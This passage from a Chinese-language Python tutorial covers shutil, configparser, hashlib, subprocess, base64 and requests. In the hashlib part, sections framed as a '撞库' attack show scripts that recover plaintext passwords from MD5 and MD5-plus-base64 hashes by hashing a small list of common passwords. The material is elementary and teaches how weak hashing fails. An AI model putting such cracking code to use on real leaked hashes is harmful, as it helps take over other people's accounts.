<span class="hljs-number">3</span> shutil.copyfileobj(open(<span class="hljs-string">&apos;old.xml&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>), open(<span class="hljs-string">&apos;new.xml&apos;</span>, <span class="hljs-string">&apos;w&apos;</span>))


shutil.copyfile(src, dst)
&#x62F7;&#x8D1D;&#x6587;&#x4EF6;

<span class="hljs-number">1</span> shutil.copyfile(<span class="hljs-string">&apos;f1.log&apos;</span>, <span class="hljs-string">&apos;f2.log&apos;</span>) <span class="hljs-comment">#&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x65E0;&#x9700;&#x5B58;&#x5728;</span>
shutil.copymode(src, dst)
&#x4EC5;&#x62F7;&#x8D1D;&#x6743;&#x9650;&#x3002;&#x5185;&#x5BB9;&#x3001;&#x7EC4;&#x3001;&#x7528;&#x6237;&#x5747;&#x4E0D;&#x53D8;

<span class="hljs-number">1</span> shutil.copymode(<span class="hljs-string">&apos;f1.log&apos;</span>, <span class="hljs-string">&apos;f2.log&apos;</span>) <span class="hljs-comment">#&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5B58;&#x5728;</span>


shutil.copystat(src, dst)
&#x4EC5;&#x62F7;&#x8D1D;&#x72B6;&#x6001;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;mode bits, atime, mtime, flags

<span class="hljs-number">1</span> shutil.copystat(<span class="hljs-string">&apos;f1.log&apos;</span>, <span class="hljs-string">&apos;f2.log&apos;</span>) <span class="hljs-comment">#&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5B58;&#x5728;</span>


shutil.copy(src, dst)
&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x548C;&#x6743;&#x9650;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
<span class="hljs-number">3</span> shutil.copy(<span class="hljs-string">&apos;f1.log&apos;</span>, <span class="hljs-string">&apos;f2.log&apos;</span>)


shutil.copy2(src, dst)
&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x548C;&#x72B6;&#x6001;&#x4FE1;&#x606F;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
<span class="hljs-number">3</span> shutil.copy2(<span class="hljs-string">&apos;f1.log&apos;</span>, <span class="hljs-string">&apos;f2.log&apos;</span>)


shutil.ignore_patterns(*patterns)
shutil.copytree(src, dst, symlinks=<span class="hljs-keyword">False</span>, ignore=<span class="hljs-keyword">None</span>)
&#x9012;&#x5F52;&#x7684;&#x53BB;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x5939;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
<span class="hljs-number">3</span> shutil.copytree(<span class="hljs-string">&apos;folder1&apos;</span>, <span class="hljs-string">&apos;folder2&apos;</span>, ignore=shutil.ignore_patterns(<span class="hljs-string">&apos;*.pyc&apos;</span>, <span class="hljs-string">&apos;tmp*&apos;</span>)) <span class="hljs-comment">#&#x76EE;&#x6807;&#x76EE;&#x5F55;&#x4E0D;&#x80FD;&#x5B58;&#x5728;&#xFF0C;&#x6CE8;&#x610F;&#x5BF9;folder2&#x76EE;&#x5F55;&#x7236;&#x7EA7;&#x76EE;&#x5F55;&#x8981;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650;&#xFF0C;ignore&#x7684;&#x610F;&#x601D;&#x662F;&#x6392;&#x9664; </span>
 &#x62F7;&#x8D1D;&#x8F6F;&#x8FDE;&#x63A5;


shutil.rmtree(path[, ignore_errors[, onerror]])
&#x9012;&#x5F52;&#x7684;&#x53BB;&#x5220;&#x9664;&#x6587;&#x4EF6;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
<span class="hljs-number">3</span> shutil.rmtree(<span class="hljs-string">&apos;folder1&apos;</span>)


shutil.move(src, dst)
&#x9012;&#x5F52;&#x7684;&#x53BB;&#x79FB;&#x52A8;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x7C7B;&#x4F3C;mv&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x91CD;&#x547D;&#x540D;&#x3002;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
<span class="hljs-number">3</span> shutil.move(<span class="hljs-string">&apos;folder1&apos;</span>, <span class="hljs-string">&apos;folder3&apos;</span>)


shutil.make_archive(base_name, format,...)

&#x521B;&#x5EFA;&#x538B;&#x7F29;&#x5305;&#x5E76;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;zip&#x3001;tar

&#x521B;&#x5EFA;&#x538B;&#x7F29;&#x5305;&#x5E76;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;zip&#x3001;tar

base_name&#xFF1A; &#x538B;&#x7F29;&#x5305;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x538B;&#x7F29;&#x5305;&#x7684;&#x8DEF;&#x5F84;&#x3002;&#x53EA;&#x662F;&#x6587;&#x4EF6;&#x540D;&#x65F6;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;&#x81F3;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x5426;&#x5219;&#x4FDD;&#x5B58;&#x81F3;&#x6307;&#x5B9A;&#x8DEF;&#x5F84;&#xFF0C;
&#x5982; data_bak                       =&gt;&#x4FDD;&#x5B58;&#x81F3;&#x5F53;&#x524D;&#x8DEF;&#x5F84;
&#x5982;&#xFF1A;/tmp/data_bak =&gt;&#x4FDD;&#x5B58;&#x81F3;/tmp/
format&#xFF1A; &#x538B;&#x7F29;&#x5305;&#x79CD;&#x7C7B;&#xFF0C;&#x201C;zip&#x201D;, &#x201C;tar&#x201D;, &#x201C;bztar&#x201D;&#xFF0C;&#x201C;gztar&#x201D;
root_dir&#xFF1A; &#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&#xFF08;&#x9ED8;&#x8BA4;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF09;
owner&#xFF1A; &#x7528;&#x6237;&#xFF0C;&#x9ED8;&#x8BA4;&#x5F53;&#x524D;&#x7528;&#x6237;
group&#xFF1A; &#x7EC4;&#xFF0C;&#x9ED8;&#x8BA4;&#x5F53;&#x524D;&#x7EC4;
logger&#xFF1A; &#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#xFF0C;&#x901A;&#x5E38;&#x662F;logging.Logger&#x5BF9;&#x8C61;
<span class="hljs-number">1</span> <span class="hljs-comment">#&#x5C06; /data &#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x6253;&#x5305;&#x653E;&#x7F6E;&#x5F53;&#x524D;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;</span>
<span class="hljs-number">2</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">3</span> ret = shutil.make_archive(<span class="hljs-string">&quot;data_bak&quot;</span>, <span class="hljs-string">&apos;gztar&apos;</span>, root_dir=<span class="hljs-string">&apos;/data&apos;</span>)
<span class="hljs-number">4</span>   
<span class="hljs-number">5</span>   
<span class="hljs-number">6</span> <span class="hljs-comment">#&#x5C06; /data&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x6253;&#x5305;&#x653E;&#x7F6E; /tmp/&#x76EE;&#x5F55;</span>
<span class="hljs-number">7</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">8</span> ret = shutil.make_archive(<span class="hljs-string">&quot;/tmp/data_bak&quot;</span>, <span class="hljs-string">&apos;gztar&apos;</span>, root_dir=<span class="hljs-string">&apos;/data&apos;</span>)
</code></pre>
<h5 id="pickle&#xFF0C;json&#xFF0C;shelve">pickle&#xFF0C;json&#xFF0C;shelve</h5>
<p>&#x89C1;python&#x7684;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6587;&#x7AE0;</p>
<h5 id="configparser">configparser</h5>
<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5982;&#x4E0B;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x6CE8;&#x91CA;1</span>
; &#x6CE8;&#x91CA;<span class="hljs-number">2</span>

[section1]
k1 = v1
k2:v2
user=egon
age=<span class="hljs-number">18</span>
is_admin=true
salary=<span class="hljs-number">31</span>

[section2]
k1 = v1
</code></pre>
<h6 id="&#x8BFB;&#x53D6;">&#x8BFB;&#x53D6;</h6>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> configparser

config=configparser.ConfigParser()
config.read(<span class="hljs-string">&apos;a.cfg&apos;</span>)

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x6807;&#x9898;</span>
res=config.sections() <span class="hljs-comment">#[&apos;section1&apos;, &apos;section2&apos;]</span>
print(res)

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;&#x6240;&#x6709;key=value&#x7684;key</span>
options=config.options(<span class="hljs-string">&apos;section1&apos;</span>)
print(options) <span class="hljs-comment">#[&apos;k1&apos;, &apos;k2&apos;, &apos;user&apos;, &apos;age&apos;, &apos;is_admin&apos;, &apos;salary&apos;]</span>

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;&#x6240;&#x6709;key=value&#x7684;(key,value)&#x683C;&#x5F0F;</span>
item_list=config.items(<span class="hljs-string">&apos;section1&apos;</span>)
print(item_list) <span class="hljs-comment">#[(&apos;k1&apos;, &apos;v1&apos;), (&apos;k2&apos;, &apos;v2&apos;), (&apos;user&apos;, &apos;egon&apos;), (&apos;age&apos;, &apos;18&apos;), (&apos;is_admin&apos;, &apos;true&apos;), (&apos;salary&apos;, &apos;31&apos;)]</span>

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;user&#x7684;&#x503C;=&gt;&#x5B57;&#x7B26;&#x4E32;&#x683C;&#x5F0F;</span>
val=config.get(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;user&apos;</span>)
print(val) <span class="hljs-comment">#egon</span>

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;age&#x7684;&#x503C;=&gt;&#x6574;&#x6570;&#x683C;&#x5F0F;</span>
val1=config.getint(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;age&apos;</span>)
print(val1) <span class="hljs-comment">#18</span>

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;is_admin&#x7684;&#x503C;=&gt;&#x5E03;&#x5C14;&#x503C;&#x683C;&#x5F0F;</span>
val2=config.getboolean(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;is_admin&apos;</span>)
print(val2) <span class="hljs-comment">#True</span>

<span class="hljs-comment">#&#x67E5;&#x770B;&#x6807;&#x9898;section1&#x4E0B;salary&#x7684;&#x503C;=&gt;&#x6D6E;&#x70B9;&#x578B;&#x683C;&#x5F0F;</span>
val3=config.getfloat(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;salary&apos;</span>)
print(val3) <span class="hljs-comment">#31.0</span>
</code></pre>
<h6 id="&#x6539;&#x5199;">&#x6539;&#x5199;</h6>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> configparser

config=configparser.ConfigParser()
config.read(<span class="hljs-string">&apos;a.cfg&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)


<span class="hljs-comment">#&#x5220;&#x9664;&#x6574;&#x4E2A;&#x6807;&#x9898;section2</span>
config.remove_section(<span class="hljs-string">&apos;section2&apos;</span>)

<span class="hljs-comment">#&#x5220;&#x9664;&#x6807;&#x9898;section1&#x4E0B;&#x7684;&#x67D0;&#x4E2A;k1&#x548C;k2</span>
config.remove_option(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;k1&apos;</span>)
config.remove_option(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;k2&apos;</span>)

<span class="hljs-comment">#&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x67D0;&#x4E2A;&#x6807;&#x9898;</span>
print(config.has_section(<span class="hljs-string">&apos;section1&apos;</span>))

<span class="hljs-comment">#&#x5224;&#x65AD;&#x6807;&#x9898;section1&#x4E0B;&#x662F;&#x5426;&#x6709;user</span>
print(config.has_option(<span class="hljs-string">&apos;section1&apos;</span>,<span class="hljs-string">&apos;&apos;</span>))


<span class="hljs-comment">#&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x6807;&#x9898;</span>
config.add_section(<span class="hljs-string">&apos;egon&apos;</span>)

<span class="hljs-comment">#&#x5728;&#x6807;&#x9898;egon&#x4E0B;&#x6DFB;&#x52A0;name=egon,age=18&#x7684;&#x914D;&#x7F6E;</span>
config.set(<span class="hljs-string">&apos;egon&apos;</span>,<span class="hljs-string">&apos;name&apos;</span>,<span class="hljs-string">&apos;egon&apos;</span>)
config.set(<span class="hljs-string">&apos;egon&apos;</span>,<span class="hljs-string">&apos;age&apos;</span>,<span class="hljs-number">18</span>) <span class="hljs-comment">#&#x62A5;&#x9519;,&#x5FC5;&#x987B;&#x662F;&#x5B57;&#x7B26;&#x4E32;</span>


<span class="hljs-comment">#&#x6700;&#x540E;&#x5C06;&#x4FEE;&#x6539;&#x7684;&#x5185;&#x5BB9;&#x5199;&#x5165;&#x6587;&#x4EF6;,&#x5B8C;&#x6210;&#x6700;&#x7EC8;&#x7684;&#x4FEE;&#x6539;</span>
config.write(open(<span class="hljs-string">&apos;a.cfg&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>))
</code></pre>
<h4 id="hash">hash</h4>
<p>hash&#x7B97;&#x6CD5;&#x5C31;&#x50CF;&#x4E00;&#x5EA7;&#x5DE5;&#x5382;&#xFF0C;&#x5DE5;&#x5382;&#x63A5;&#x6536;&#x4F60;&#x9001;&#x6765;&#x7684;&#x539F;&#x6750;&#x6599;&#xFF08;&#x53EF;&#x4EE5;&#x7528;m.update()&#x4E3A;&#x5DE5;&#x5382;&#x8FD0;&#x9001;&#x539F;&#x6750;&#x6599;&#xFF09;&#xFF0C;&#x7ECF;&#x8FC7;&#x52A0;&#x5DE5;&#x8FD4;&#x56DE;&#x7684;&#x4EA7;&#x54C1;&#x5C31;&#x662F;hash&#x503C;</p>
<p><a href="https://imgtu.com/i/bdWGb8" target="_blank"><img src="https://s4.ax1x.com/2022/03/05/bdWGb8.png" alt="bdWGb8.png"></a></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib
m=hashlib.md5()<span class="hljs-comment"># m=hashlib.sha256()</span>
m.update(<span class="hljs-string">&apos;hello&apos;</span>.encode(<span class="hljs-string">&apos;utf8&apos;</span>))
print(m.hexdigest())  <span class="hljs-comment">#5d41402abc4b2a76b9719d911017c592</span>
m.update(<span class="hljs-string">&apos;alvin&apos;</span>.encode(<span class="hljs-string">&apos;utf8&apos;</span>))
print(m.hexdigest())  <span class="hljs-comment">#92a7e713c30abbb0319fa07da2a5c4af</span>
m2=hashlib.md5()
m2.update(<span class="hljs-string">&apos;helloalvin&apos;</span>.encode(<span class="hljs-string">&apos;utf8&apos;</span>))
print(m2.hexdigest()) <span class="hljs-comment">#92a7e713c30abbb0319fa07da2a5c4af</span>
<span class="hljs-string">&apos;&apos;&apos;
&#x6CE8;&#x610F;&#xFF1A;&#x628A;&#x4E00;&#x6BB5;&#x5F88;&#x957F;&#x7684;&#x6570;&#x636E;update&#x591A;&#x6B21;&#xFF0C;&#x4E0E;&#x4E00;&#x6B21;update&#x8FD9;&#x6BB5;&#x957F;&#x6570;&#x636E;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x4E00;&#x6837;
&#x4F46;&#x662F;update&#x591A;&#x6B21;&#x4E3A;&#x6821;&#x9A8C;&#x5927;&#x6587;&#x4EF6;&#x63D0;&#x4F9B;&#x4E86;&#x53EF;&#x80FD;&#x3002;
&apos;&apos;&apos;</span>
</code></pre>
<h6 id="&#x5C1D;&#x8BD5;&#x649E;&#x5E93;&#x653B;&#x51FB;">&#x5C1D;&#x8BD5;&#x649E;&#x5E93;&#x653B;&#x51FB;</h6>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib

crypto_content = <span class="hljs-string">&apos;25f9e794323b453885f5181f1b624d0b&apos;</span>

password = [
    <span class="hljs-string">&apos;123456&apos;</span>,
    <span class="hljs-string">&apos;123&apos;</span>,
    <span class="hljs-string">&apos;admin&apos;</span>,
    <span class="hljs-string">&apos;admin123456&apos;</span>,
    <span class="hljs-string">&apos;admin123&apos;</span>,
    <span class="hljs-string">&apos;888888&apos;</span>,
    <span class="hljs-string">&apos;88888888&apos;</span>,
    <span class="hljs-string">&apos;123456789&apos;</span>,
    <span class="hljs-string">&apos;admin88888&apos;</span>
]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> password:
    a = hashlib.md5()
    a.update(i.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
    res = a.hexdigest()
    <span class="hljs-keyword">if</span> res == crypto_content:
        print(i + <span class="hljs-string">&quot;&#x662F;&#x539F;&#x6765;&#x7684;&#x503C;&quot;</span>)
---------------------------------------------------
<span class="hljs-number">123456789</span>&#x662F;&#x539F;&#x6765;&#x7684;&#x503C;
</code></pre>
<h6 id="&#x5BC6;&#x7801;&#x52A0;&#x76D0;salt">&#x5BC6;&#x7801;&#x52A0;&#x76D0;salt</h6>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x62FC;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x628A;salt&#x653E;&#x5728;&#x524D;&#xFF0C;&#x4E2D;&#xFF0C;&#x540E;&#x90FD;&#x53EF;&#x4EE5;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib

m=hashlib.md5()

m.update(<span class="hljs-string">&apos;&#x5929;&#x738B;&apos;</span>.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
m.update(<span class="hljs-string">&apos;alex3714&apos;</span>.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
m.update(<span class="hljs-string">&apos;&#x76D6;&#x5730;&#x864E;&apos;</span>.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
print(m.hexdigest())
</code></pre>
<h5 id="subprocess">subprocess</h5>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> subprocess

res = subprocess.Popen(<span class="hljs-string">&apos;dir&apos;</span>,shell=<span class="hljs-keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
<span class="hljs-comment">#    &#x8FD9;&#x91CC;dir&#x662F;&#x4F60;&#x6267;&#x884C;&#x7684;shell&#x547D;&#x4EE4;&#xFF0C;stdout=subprocess.PIPE&#x662F;&#x5F53;&#x6267;&#x884C;&#x6210;&#x529F;&#x540E;&#x628A;&#x4ED6;&#x653E;&#x5728;&#x7BA1;&#x9053;&#x91CC;&#xFF0C;PIPE,stderr=subprocess.PIPE&#x662F;&#x6267;&#x884C;&#x5931;&#x8D25;&#x65F6;&#x653E;&#x5728;&#x7BA1;&#x9053;&#x91CC;</span>
das = res.stdout.read()    <span class="hljs-comment">#    &#x8BA9;das&#x8BFB;&#x51FA;&#x6267;&#x884C;&#x6210;&#x529F;&#x7BA1;&#x9053;&#x91CC;&#x7684;&#x503C;</span>
das_1 = res.stderr.read()  <span class="hljs-comment">#    &#x8BA9;das_1&#x8BFB;&#x51FA;&#x6267;&#x884C;&#x5931;&#x8D25;&#x7BA1;&#x9053;&#x91CC;&#x7684;&#x503C;</span>
print(das.decode(<span class="hljs-string">&apos;gbk&apos;</span>))    <span class="hljs-comment">#    &#x8FD9;&#x91CC;gbk&#x4EE3;&#x8868;&#x662F;windows&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x662F;linux&#x4E0B;&#x90A3;&#x4E48;&#x662F;utf-8</span>
</code></pre>
<h5 id="base64">base64</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x60F3;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x7F16;&#x7801;&#x6210;base64,&#x8981;&#x5148;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</span>
<span class="hljs-keyword">import</span> base64
url = <span class="hljs-string">&quot;https://www.cnblogs.com/songzhixue/&quot;</span>
bytes_url = url.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
str_url = base64.b64encode(bytes_url)  <span class="hljs-comment"># &#x88AB;&#x7F16;&#x7801;&#x7684;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</span>
print(bytes_url)

<span class="hljs-comment"># b&apos;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&apos;</span>
-------------------------------------------------------------------------------------------------
<span class="hljs-comment"># &#x5C06;base64&#x89E3;&#x7801;&#x6210;&#x5B57;&#x7B26;&#x4E32;</span>
<span class="hljs-keyword">import</span> base64
url = <span class="hljs-string">&quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;</span>
str_url = base64.b64decode(url).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)
print(str_url)

<span class="hljs-comment"># &apos;https://www.cnblogs.com/songzhixue/&apos;</span>
</code></pre>
<p>&#x5BF9;admin888&#x5148;&#x8FDB;&#x884C;md5&#x52A0;&#x5BC6;&#x518D;&#x8FDB;&#x884C;base64&#x7F16;&#x7801;&#x5F97;&#x5230;N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=</p>
<p>&#x7136;&#x540E;&#x518D;&#x5BF9;N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=&#x8FDB;&#x884C;base64&#x89E3;&#x7801;&#xFF0C;&#x518D;&#x649E;&#x5E93;&#x653B;&#x51FB;&#x5F97;&#x5230;admin888</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> base64

source = <span class="hljs-string">&quot;admin888&quot;</span>
a = hashlib.md5()
a.update(source.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
source_1 = a.hexdigest()
source_2 = source_1.encode(<span class="hljs-string">&apos;utf-8&apos;</span>)
source_3 = base64.b64encode(source_2)
print(source_3)

<span class="hljs-comment">#   N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> base64

source = <span class="hljs-string">&quot;N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=&quot;</span>

source_1 = source.encode(<span class="hljs-string">&apos;utf-8&apos;</span>)

source_2 = base64.b64decode(source_1)
source_3 = source_2.decode(<span class="hljs-string">&apos;utf-8&apos;</span>)

<span class="hljs-comment"># print(source_3,type(source_3))</span>
dict_1 = [
<span class="hljs-string">&apos;admin&apos;</span>,
<span class="hljs-string">&apos;123456&apos;</span>,
<span class="hljs-string">&apos;8888888&apos;</span>,
<span class="hljs-string">&apos;a123456&apos;</span>,
<span class="hljs-string">&apos;888888&apos;</span>,
<span class="hljs-string">&apos;batmanfuture&apos;</span>,
<span class="hljs-string">&apos;12345678&apos;</span>,
<span class="hljs-string">&apos;654321&apos;</span>,
<span class="hljs-string">&apos;system&apos;</span>,
<span class="hljs-string">&apos;admin888&apos;</span>,         <span class="hljs-comment">#   &#x5BF9;admin888&#x5148;&#x8FDB;&#x884C;md5--&gt;7fef6171469e80d32c0559f88b377245</span>
<span class="hljs-string">&apos;superman&apos;</span>                                  <span class="hljs-comment">#7fef6171469e80d32c0559f88b377245</span>
]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dict_1:
    a = hashlib.md5()
    a.update(i.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))
    b = a.hexdigest()

    b = str(b)
    <span class="hljs-keyword">if</span> b <span class="hljs-keyword">in</span> source_3:
        print(<span class="hljs-string">&quot;&#x627E;&#x5230;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x4E86;,&#x5BC6;&#x7801;&#x662F;&quot;</span> + i)
</code></pre>
<h5 id="requests">requests</h5>
<h6 id="&#x51E0;&#x79CD;&#x722C;&#x866B;&#x5F15;&#x64CE;&#x7684;&#x4E3B;&#x673A;&#x5934;">&#x51E0;&#x79CD;&#x722C;&#x866B;&#x5F15;&#x64CE;&#x7684;&#x4E3B;&#x673A;&#x5934;</h6>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x767E;&#x5EA6;</span>
Mozilla/<span class="hljs-number">5.0</span> (compatible; Baiduspider/<span class="hljs-number">2.0</span>; +http://www.baidu.com/search/spider.html)
<span class="hljs-comment">#    &#x8C37;&#x6B4C;</span>
Mozilla/<span class="hljs-number">5.0</span> (Linux; Android <span class="hljs-number">6.0</span><span class="hljs-number">.1</span>; Nexus <span class="hljs-number">5</span>X Build/MMB29P) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">41.0</span><span class="hljs-number">.2272</span><span class="hljs-number">.96</span> Mobile Safari/<span class="hljs-number">537.36</span> (compatible; Googlebot/<span class="hljs-number">2.1</span>; +http://www.google.com/bot.html)
<span class="hljs-comment">#    &#x641C;&#x72D7;</span>
Sogou web spider/<span class="hljs-number">4.0</span>(+http://www.sogou.com/docs/help/webmasters.htm<span class="hljs-comment">#07)</span>
<span class="hljs-comment">#    360</span>
Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">6.1</span>; WOW64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">50.0</span><span class="hljs-number">.2661</span><span class="hljs-number">.102</span> Safari/<span class="hljs-number">537.36</span>; <span class="hljs-number">360</span>Spider
</code></pre>
<h6 id="&#x6A21;&#x5757;&#x4ECB;&#x7ECD;">&#x6A21;&#x5757;&#x4ECB;&#x7ECD;</h6>
<p><a href="https://imgtu.com/i/bwsTGq" target="_blank"><img src="https://s4.ax1x.com/2022/03/05/bwsTGq.png" alt="bwsTGq.png"></a></p>
<pre><code class="lang-python">url=<span class="hljs-string">&quot;&#x4F60;&#x60F3;&#x83B7;&#x53D6;&#x7684;&#x7F51;&#x5740;&quot;</span>
r=requests.get(url)
<span class="hljs-comment">#&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;r=requests.get(&quot;&#x4F60;&#x60F3;&#x8981;&#x83B7;&#x53D6;&#x7684;&#x7F51;&#x5740;&quot;)</span>
<span class="hljs-comment">#&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x4E2A;&#x540D;&#x53EB;r&#x7684;Response&#x5BF9;&#x8C61;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x4E2D;&#x6765;&#x83B7;&#x53D6;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x4FE1;&#x606F;</span>
<span class="hljs-comment">#(&#x53EF;&#x9009;)&#x662F;&#x53EF;&#x8981;&#x53EF;&#x4E0D;&#x8981;&#x7684;&#x610F;&#x601D;</span>
<span class="hljs-comment">#&#x4E0B;&#x9762;&#x7684;url params **kwards data json&#x7684;&#x610F;&#x601D;</span>
<span class="hljs-comment">#url:&#x7F51;&#x5740;</span>
<span class="hljs-comment">#param:&#x53C2;&#x6570;(&#x53EF;&#x9009;)&#x5B57;&#x5178;&#xFF0C;&#x8981;&#x5728;&#x8BF7;&#x6C42;&#x7684;&#x67E5;&#x8BE2;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x53D1;&#x9001;&#x7684;&#x5143;&#x7EC4;&#x6216;&#x5B57;&#x8282;&#x7684;&#x5217;&#x8868;&#x3002;</span>
<span class="hljs-comment">#**kwards:&#x91C7;&#x7528;&#x53EF;&#x9009;&#x53C2;&#x6570;</span>
<span class="hljs-comment">#data:&#xFF08;&#x53EF;&#x9009;&#xFF09; &#x5B57;&#x5178;&#x3001;&#x8981;&#x5728;&#x8BF7;&#x6C42;&#x7684;&#x6B63;&#x6587;&#x4E2D;&#x53D1;&#x9001;&#x7684;&#x5143;&#x7EC4;&#x3001;&#x5B57;&#x8282;&#x6216;&#x6587;&#x4EF6;&#x7C7B;&#x5BF9;&#x8C61;&#x7684;&#x5217;&#x8868;&#x3002;</span>
<span class="hljs-comment">#json:&#xFF08;&#x53EF;&#x9009;&#xFF09; json &#x6570;&#x636E;&#x53D1;&#x9001;&#x5230;&#x8BF7;&#x6C42;&#x7684;&#x6B63;&#x6587;&#x3002;</span>
<span class="hljs-comment">#requests.get(url, params=None, **kwargs)GET&#x8BF7;&#x6C42;</span>
<span class="hljs-comment">#requests.post(url, data=None, json=None, **kwargs) POST&#x8BF7;&#x6C42;</span>
